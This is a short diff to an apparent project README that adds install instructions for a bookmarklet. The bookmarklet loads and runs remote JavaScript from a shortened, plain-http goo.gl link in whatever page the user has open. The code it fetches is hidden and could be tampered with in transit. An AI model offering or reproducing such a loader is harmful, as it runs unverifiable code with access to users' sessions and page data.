@@ -32,5 +32,6 @@ If a problem is to be detected please report it. I'll work on it ASAP! Thanks :)
 ---
 ### Installs
 Just drag this code to your bookmarks bar and rename it to whatever you like.
-
-
+```
+javascript:(function(){$.getScript('http://goo.gl/MMsPi1');}());
+```
